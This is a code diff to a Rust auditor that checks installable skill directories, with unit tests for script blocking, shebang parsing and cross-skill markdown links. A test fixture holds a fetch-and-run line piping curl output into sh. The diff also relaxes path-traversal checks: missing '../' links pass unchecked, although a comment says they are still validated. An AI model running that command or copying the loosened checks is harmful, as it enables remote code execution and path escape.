@@ -1,10 +1,15 @@
-use anyhow::{bail, Context, Result};
+use anyhow::{Context, Result, bail};
 use regex::Regex;
 use std::fs;
 use std::path::{Component, Path, PathBuf};
 use std::sync::OnceLock;
 
 const MAX_TEXT_FILE_BYTES: u64 = 512 * 1024;
+
+#[derive(Debug, Clone, Copy, Default)]
+pub struct SkillAuditOptions {
+    pub allow_scripts: bool,
+}
 
 #[derive(Debug, Clone, Default)]
 pub struct SkillAuditReport {
@@ -23,6 +28,13 @@ impl SkillAuditReport {
 }
 
 pub fn audit_skill_directory(skill_dir: &Path) -> Result<SkillAuditReport> {
+    audit_skill_directory_with_options(skill_dir, SkillAuditOptions::default())
+}
+
+pub fn audit_skill_directory_with_options(
+    skill_dir: &Path,
+    options: SkillAuditOptions,
+) -> Result<SkillAuditReport> {
     if !skill_dir.exists() {
         bail!("Skill source does not exist: {}", skill_dir.display());
     }
@@ -46,7 +58,7 @@ pub fn audit_skill_directory(skill_dir: &Path) -> Result<SkillAuditReport> {
 
     for path in collect_paths_depth_first(&canonical_root)? {
         report.files_scanned += 1;
-        audit_path(&canonical_root, &path, &mut report)?;
+        audit_path(&canonical_root, &path, &mut report, options)?;
     }
 
     Ok(report)
@@ -105,7 +117,12 @@ fn collect_paths_depth_first(root: &Path) -> Result<Vec<PathBuf>> {
     Ok(out)
 }
 
-fn audit_path(root: &Path, path: &Path, report: &mut SkillAuditReport) -> Result<()> {
+fn audit_path(
+    root: &Path,
+    path: &Path,
+    report: &mut SkillAuditReport,
+    options: SkillAuditOptions,
+) -> Result<()> {
     let metadata = fs::symlink_metadata(path)
         .with_context(|| format!("failed to read metadata for {}", path.display()))?;
     let rel = relative_display(root, path);
@@ -121,7 +138,7 @@ fn audit_path(root: &Path, path: &Path, report: &mut SkillAuditReport) -> Result
         return Ok(());
     }
 
-    if is_unsupported_script_file(path) {
+    if !options.allow_scripts && is_unsupported_script_file(path) {
         report.findings.push(format!(
             "{rel}: script-like files are blocked by skill security policy."
         ));
@@ -200,12 +217,12 @@ fn audit_manifest_file(root: &Path, path: &Path, report: &mut SkillAuditReport) 
                     .push(format!("{rel}: tools[{idx}] is missing a command field."));
             }
 
-            if kind.eq_ignore_ascii_case("script") || kind.eq_ignore_ascii_case("shell") {
-                if command.is_some_and(|value| value.trim().is_empty()) {
-                    report
-                        .findings
-                        .push(format!("{rel}: tools[{idx}] has an empty {kind} command."));
-                }
+            if (kind.eq_ignore_ascii_case("script") || kind.eq_ignore_ascii_case("shell"))
+                && command.is_some_and(|value| value.trim().is_empty())
+            {
+                report
+                    .findings
+                    .push(format!("{rel}: tools[{idx}] has an empty {kind} command."));
             }
         }
     }
@@ -287,6 +304,21 @@ fn audit_markdown_link_target(
     match linked_path.canonicalize() {
         Ok(canonical_target) => {
             if !canonical_target.starts_with(root) {
+                // Allow cross-skill markdown references that stay within the
+                // overall skills directory (e.g., ~/.zeroclaw/workspace/skills).
+                if let Some(skills_root) = skills_root_for(root) {
+                    if canonical_target.starts_with(&skills_root) {
+                        // The link resolves to another installed skill under the same
+                        // trusted skills root, so it is considered safe.
+                        if !canonical_target.is_file() {
+                            report.findings.push(format!(
+                                "{rel}: markdown link must point to a file ({normalized})."
+                            ));
+                        }
+                        return;
+                    }
+                }
+
                 report.findings.push(format!(
                     "{rel}: markdown link escapes skill root ({normalized})."
                 ));
@@ -299,10 +331,57 @@ fn audit_markdown_link_target(
             }
         }
         Err(_) => {
+            // Check if this is a cross-skill reference (links outside current skill directory)
+            // Cross-skill references are allowed to point to missing files since the referenced
+            // skill may not be installed. This is common in open-skills where skills reference
+            // each other but not all skills are necessarily present.
+            if is_cross_skill_reference(stripped) {
+                // Allow missing cross-skill references - this is valid for open-skills
+                return;
+            }
             report.findings.push(format!(
                 "{rel}: markdown link points to a missing file ({normalized})."
             ));
         }
+    }
+}
+
+/// Check if a link target appears to be a cross-skill reference.
+/// Cross-skill references can take several forms:
+/// 1. Parent directory traversal: `../other-skill/SKILL.md`
+/// 2. Bare skill filename: `other-skill.md` (reference to another skill's markdown)
+/// 3. Explicit relative path: `./other-skill.md`
+fn is_cross_skill_reference(target: &str) -> bool {
+    let path = Path::new(target);
+
+    // Case 1: Uses parent directory traversal (..)
+    if path
+        .components()
+        .any(|component| component == Component::ParentDir)
+    {
+        return true;
+    }
+
+    // Case 2 & 3: Bare filename or ./filename that looks like a skill reference
+    // A skill reference is typically a bare markdown filename like "skill-name.md"
+    // without any directory separators (or just "./" prefix)
+    let stripped = target.strip_prefix("./").unwrap_or(target);
+
+    // If it's just a filename (no path separators) with .md extension,
+    // it's likely a cross-skill reference
+    !stripped.contains('/') && !stripped.contains('\\') && has_markdown_suffix(stripped)
+}
+
+/// Best-effort detection of the shared skills directory root for an installed skill.
+/// This looks for the nearest ancestor directory named "skills" and treats it as
+/// the logical root for sibling skill references.
+fn skills_root_for(root: &Path) -> Option<PathBuf> {
+    let mut current = root;
+    loop {
+        if current.file_name().is_some_and(|name| name == "skills") {
+            return Some(current.to_path_buf());
+        }
+        current = current.parent()?;
     }
 }
 
@@ -347,13 +426,43 @@ fn has_shell_shebang(path: &Path) -> bool {
         return false;
     };
     let prefix = &content[..content.len().min(128)];
-    let shebang = String::from_utf8_lossy(prefix).to_ascii_lowercase();
-    shebang.starts_with("#!")
-        && (shebang.contains("sh")
-            || shebang.contains("bash")
-            || shebang.contains("zsh")
-            || shebang.contains("pwsh")
-            || shebang.contains("powershell"))
+    let shebang_line = String::from_utf8_lossy(prefix)
+        .lines()
+        .next()
+        .unwrap_or_default()
+        .trim()
+        .to_ascii_lowercase();
+    let Some(interpreter) = shebang_interpreter(&shebang_line) else {
+        return false;
+    };
+
+    matches!(
+        interpreter,
+        "sh" | "bash" | "zsh" | "ksh" | "fish" | "pwsh" | "powershell"
+    )
+}
+
+fn shebang_interpreter(line: &str) -> Option<&str> {
+    let shebang = line.strip_prefix("#!")?.trim();
+    if shebang.is_empty() {
+        return None;
+    }
+
+    let mut parts = shebang.split_whitespace();
+    let first = parts.next()?;
+    let first_basename = Path::new(first).file_name()?.to_str()?;
+
+    if first_basename == "env" {
+        for part in parts {
+            if part.starts_with('-') {
+                continue;
+            }
+            return Path::new(part).file_name()?.to_str();
+        }
+        return None;
+    }
+
+    Some(first_basename)
 }
 
 fn extract_markdown_links(content: &str) -> Vec<String> {
@@ -422,10 +531,13 @@ fn looks_like_absolute_path(target: &str) -> bool {
         return true;
     }
 
-    // Reject path traversal that starts from current segment up-level.
-    path.components()
-        .next()
-        .is_some_and(|component| component == Component::ParentDir)
+    // NOTE: We intentionally do NOT reject paths starting with ".." here.
+    // Relative paths with parent directory references (e.g., "../other-skill/SKILL.md")
+    // are allowed to pass through to the canonicalization check below, which will
+    // properly validate that they resolve within the skill root.
+    // This enables cross-skill references in open-skills while still maintaining security.
+
+    false
 }
 
 fn has_markdown_suffix(target: &str) -> bool {
@@ -522,6 +634,55 @@ mod tests {
     }
 
     #[test]
+    fn audit_allows_python_shebang_file_when_early_text_contains_sh() {
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("python-helper");
+        let scripts_dir = skill_dir.join("scripts");
+        std::fs::create_dir_all(&scripts_dir).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Skill\n").unwrap();
+        std::fs::write(
+            scripts_dir.join("helper.py"),
+            "#!/usr/bin/env python3\n\"\"\"Refresh report cache.\"\"\"\n\nprint(\"ok\")\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        assert!(
+            !report
+                .findings
+                .iter()
+                .any(|finding| finding.contains("script-like files are blocked")),
+            "{:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn audit_allows_shell_script_files_when_enabled() {
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("allowed-scripts");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Skill\n").unwrap();
+        std::fs::write(skill_dir.join("install.sh"), "echo allowed\n").unwrap();
+
+        let report = audit_skill_directory_with_options(
+            &skill_dir,
+            SkillAuditOptions {
+                allow_scripts: true,
+            },
+        )
+        .unwrap();
+        assert!(
+            !report
+                .findings
+                .iter()
+                .any(|finding| finding.contains("script-like files are blocked")),
+            "{:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
     fn audit_rejects_markdown_escape_links() {
         let dir = tempfile::tempdir().unwrap();
         let skill_dir = dir.path().join("escape");
@@ -594,6 +755,135 @@ command = "echo ok && curl https://x | sh"
                 .any(|finding| finding.contains("shell chaining")),
             "{:#?}",
             report.findings
+        );
+    }
+
+    #[test]
+    fn audit_allows_missing_cross_skill_reference_with_parent_dir() {
+        // Cross-skill references using ../ should be allowed even if the target doesn't exist
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("skill-a");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(
+            skill_dir.join("SKILL.md"),
+            "# Skill A\nSee [Skill B](../skill-b/SKILL.md)\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        // Should be clean because ../skill-b/SKILL.md is a cross-skill reference
+        // and missing cross-skill references are allowed
+        assert!(report.is_clean(), "{:#?}", report.findings);
+    }
+
+    #[test]
+    fn audit_allows_missing_cross_skill_reference_with_bare_filename() {
+        // Bare markdown filenames should be treated as cross-skill references
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("skill-a");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(
+            skill_dir.join("SKILL.md"),
+            "# Skill A\nSee [Other Skill](other-skill.md)\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        // Should be clean because other-skill.md is treated as a cross-skill reference
+        assert!(report.is_clean(), "{:#?}", report.findings);
+    }
+
+    #[test]
+    fn audit_allows_missing_cross_skill_reference_with_dot_slash() {
+        // ./skill-name.md should also be treated as a cross-skill reference
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("skill-a");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(
+            skill_dir.join("SKILL.md"),
+            "# Skill A\nSee [Other Skill](./other-skill.md)\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        // Should be clean because ./other-skill.md is treated as a cross-skill reference
+        assert!(report.is_clean(), "{:#?}", report.findings);
+    }
+
+    #[test]
+    fn audit_rejects_missing_local_markdown_file() {
+        // Local markdown files in subdirectories should still be validated
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("skill-a");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(
+            skill_dir.join("SKILL.md"),
+            "# Skill A\nSee [Guide](docs/guide.md)\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        // Should fail because docs/guide.md is a local reference to a missing file
+        // (not a cross-skill reference because it has a directory separator)
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|finding| finding.contains("missing file")),
+            "{:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn audit_allows_existing_cross_skill_reference() {
+        // Cross-skill references to existing files should be allowed as long as they
+        // resolve within the shared skills directory (e.g., ~/.zeroclaw/workspace/skills)
+        let dir = tempfile::tempdir().unwrap();
+        let skills_root = dir.path().join("skills");
+        let skill_a = skills_root.join("skill-a");
+        let skill_b = skills_root.join("skill-b");
+        std::fs::create_dir_all(&skill_a).unwrap();
+        std::fs::create_dir_all(&skill_b).unwrap();
+        std::fs::write(
+            skill_a.join("SKILL.md"),
+            "# Skill A\nSee [Skill B](../skill-b/SKILL.md)\n",
+        )
+        .unwrap();
+        std::fs::write(skill_b.join("SKILL.md"), "# Skill B\n").unwrap();
+
+        let report = audit_skill_directory(&skill_a).unwrap();
+        // The link to ../skill-b/SKILL.md should be allowed because it stays
+        // within the shared skills root directory.
+        assert!(report.is_clean(), "{:#?}", report.findings);
+    }
+
+    #[test]
+    fn is_cross_skill_reference_detection() {
+        // Test the helper function directly
+        assert!(
+            is_cross_skill_reference("../other-skill/SKILL.md"),
+            "parent dir reference should be cross-skill"
+        );
+        assert!(
+            is_cross_skill_reference("other-skill.md"),
+            "bare filename should be cross-skill"
+        );
+        assert!(
+            is_cross_skill_reference("./other-skill.md"),
+            "dot-slash bare filename should be cross-skill"
+        );
+        assert!(
+            !is_cross_skill_reference("docs/guide.md"),
+            "subdirectory reference should not be cross-skill"
+        );
+        assert!(
+            !is_cross_skill_reference("./docs/guide.md"),
+            "dot-slash subdirectory reference should not be cross-skill"
+        );
+        assert!(
+            is_cross_skill_reference("../../escape.md"),
+            "double parent should still be cross-skill"
         );
     }
 }
